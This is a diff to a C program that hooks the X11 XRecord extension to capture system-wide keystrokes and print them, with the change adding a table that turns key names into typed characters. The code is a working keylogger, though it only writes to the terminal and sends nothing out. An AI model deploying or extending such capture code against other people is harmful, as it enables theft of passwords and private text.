@@ -18,17 +18,6 @@
 
 //XGetKeyboardControl
 
-void	setup_display(Display **dpl1, Display **dpl2)
-{
-	*dpl1 = XOpenDisplay(NULL);
-	*dpl2 = XOpenDisplay(NULL);
-	if (!*dpl1 || !*dpl2)
-	{
-		printf("Error Conecting With X server\n");
-		exit (1);
-	}
-}
-
 XRecordRange	*alloc_range(Display *dpl)
 {
 	XRecordRange	*rng;
@@ -46,6 +35,89 @@ XRecordRange	*alloc_range(Display *dpl)
 bool	SpecialChar(int Char)
 {
 	return ((Char >= 24 && Char <= 33) || (Char >= 38 && Char <= 46) || (Char >= 52 && Char <= 58));
+}
+
+void	DataBaseOfChar(char *logger)
+{
+	if (!strcmp(logger, "Return"))
+		printf("\n");
+	else if (!strcmp(logger, "Tab"))
+		printf("\t");
+	else if (!strcmp(logger, "space"))
+		printf(" ");
+	else if (!strcmp(logger, "grave"))
+		printf("`");
+	else if (!strcmp(logger, "minus"))
+		printf("-");
+	else if (!strcmp(logger, "equal"))
+		printf("=");
+	else if (!strcmp(logger, "bracketleft"))
+		printf("[");
+	else if (!strcmp(logger, "bracketright"))
+		printf("]");
+	else if (!strcmp(logger, "backslash"))
+		printf("\\");
+	else if (!strcmp(logger, "semicolon"))
+		printf(";");
+	else if (!strcmp(logger, "apostrophe"))
+		printf("'");
+	else if (!strcmp(logger, "comma"))
+		printf(",");
+	else if (!strcmp(logger, "period"))
+		printf(".");
+	else if (!strcmp(logger, "slash"))
+		printf("/");
+	else if (!strcmp(logger, "quotedbl"))
+		printf("\"");
+	else if (!strcmp(logger, "colon"))
+		printf(":");
+	else if (!strcmp(logger, "bar"))
+		printf("|");
+	else if (!strcmp(logger, "braceleft"))
+		printf("{");
+	else if (!strcmp(logger, "braceright"))
+		printf("}");
+	else if (!strcmp(logger, "asciitilde"))
+		printf("~");
+	else if (!strcmp(logger, "exclam"))
+		printf("!");
+	else if (!strcmp(logger, "at"))
+		printf("@");
+	else if (!strcmp(logger, "numbersign"))
+		printf("#");
+	else if (!strcmp(logger, "dollar"))
+		printf("$");
+	else if (!strcmp(logger, "percent"))
+		printf("%%");
+	else if (!strcmp(logger, "asciicircum"))
+		printf("^");
+	else if (!strcmp(logger, "ampersand"))
+		printf("&");
+	else if (!strcmp(logger, "asterisk"))
+		printf("*");
+	else if (!strcmp(logger, "parenleft"))
+		printf("(");
+	else if (!strcmp(logger, "parenright"))
+		printf(")");
+	else if (!strcmp(logger, "underscore"))
+		printf("_");
+	else if (!strcmp(logger, "plus"))
+		printf("+");
+	else if (!strcmp(logger, "less"))
+		printf("<");
+	else if (!strcmp(logger, "greater"))
+		printf(">");
+	else if (!strcmp(logger, "question"))
+		printf("?");
+	fflush(stdout);
+}
+
+int	ControlOutput(char *logger)
+{
+	if (strlen(logger) < 2)
+		return (printf("%s", logger), fflush(stdout));
+	DataBaseOfChar(logger);
+	return (1);
 }
 
 void	callback(XPointer xp, XRecordInterceptData *data)
@@ -79,11 +151,8 @@ void	callback(XPointer xp, XRecordInterceptData *data)
 				level = !level;
 			sm = XkbKeycodeToKeysym(dpl, key_code, 0, (int)level);
 			logger = XKeysymToString(sm);
-			printf("%s", logger);
-			fflush(stdout);
+			ControlOutput(logger);
 			XCloseDisplay(dpl);
-			//if (!strcmp(logger, "Caps_Lock"))
-			//	level = !level;
 		}
 	}
 	XRecordFreeData(data);
@@ -110,15 +179,18 @@ void	active_context(XRecordRange **rng, Display *dpl)
 int main(void)
 {
 	Display		*control_dpl;
-	Display		*data_dpl;
 	XEvent		evn;
 	XRecordRange	*rng;
 
-	setup_display(&control_dpl, &data_dpl);
+	control_dpl = XOpenDisplay(NULL);
+	if (!control_dpl)
+	{
+		printf("Error Connecting with X Servere\n");
+		exit (1);
+	}
 	rng = alloc_range(control_dpl);
 	active_context(&rng, control_dpl);
 	XCloseDisplay(control_dpl);
-	XCloseDisplay(data_dpl);
 	return (!1);
 }
 
